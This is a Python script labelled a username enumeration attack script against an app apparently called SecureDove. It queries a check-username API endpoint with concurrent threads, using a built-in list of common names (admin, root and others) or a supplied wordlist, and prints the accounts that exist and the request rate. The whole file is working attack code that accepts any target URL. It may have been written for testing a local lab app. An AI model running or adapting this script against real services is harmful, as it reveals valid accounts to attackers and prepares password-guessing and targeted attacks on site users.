#!/usr/bin/env python3
"""
SecureDove Username Enumeration Attack Script
Performs username enumeration via the /api/auth/check-username endpoint
"""

import requests
import sys
import time
import concurrent.futures
from typing import List, Optional

class UsernameEnumerator:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.api_url = f"{self.base_url}/api"
        self.found_users = []

    def check_username(self, username: str) -> Optional[str]:
        """Check if a username exists"""
        try:
            response = requests.get(
                f"{self.api_url}/auth/check-username/{username}",
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                if data.get('exists'):
                    print(f"[+] Found user: {username}")
                    return username

        except requests.RequestException as e:
            print(f"[-] Error checking {username}: {e}")

        return None

    def enumerate_usernames(self, usernames: List[str], max_workers: int = 10) -> List[str]:
        """Enumerate multiple usernames concurrently"""
        print(f"[*] Testing {len(usernames)} usernames against {self.api_url}")
        print("[*] Using concurrent requests for faster enumeration...")

        found_users = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.check_username, username) for username in usernames]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found_users.append(result)

        return found_users

    def load_username_list(self, filename: str) -> List[str]:
        """Load usernames from a file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] File {filename} not found")
            return []

def main():
    if len(sys.argv) < 2:
        print("Usage: python username_enum.py <base_url> [username_file]")
        print("Example: python username_enum.py http://localhost:8000 usernames.txt")
        sys.exit(1)

    base_url = sys.argv[1]
    username_file = sys.argv[2] if len(sys.argv) > 2 else None

    enumerator = UsernameEnumerator(base_url)

    # Default username list if no file provided
    if not username_file:
        usernames = [
            "admin", "administrator", "root", "user", "test",
            "alice", "bob", "charlie", "david", "eve",
            "john", "jane", "mike", "sarah", "tom",
            "alex", "emma", "chris", "lisa", "mark"
        ]
        print("[*] Using default username list")
    else:
        usernames = enumerator.load_username_list(username_file)
        if not usernames:
            print("[-] No usernames loaded")
            sys.exit(1)

    print(f"[*] Starting username enumeration against {enumerator.api_url}")
    start_time = time.time()

    found_users = enumerator.enumerate_usernames(usernames)

    end_time = time.time()
    duration = end_time - start_time

    print("\n[+] Enumeration complete!")
    print(f"[+] Found {len(found_users)} valid users")
    print(f"[+] Time taken: {duration:.2f} seconds")
    print(f"[+] Rate: {len(usernames)/duration:.2f} usernames/second")

    if found_users:
        print("\n[+] Valid usernames found:")
        for user in found_users:
            print(f"    - {user}")

if __name__ == "__main__":
    main()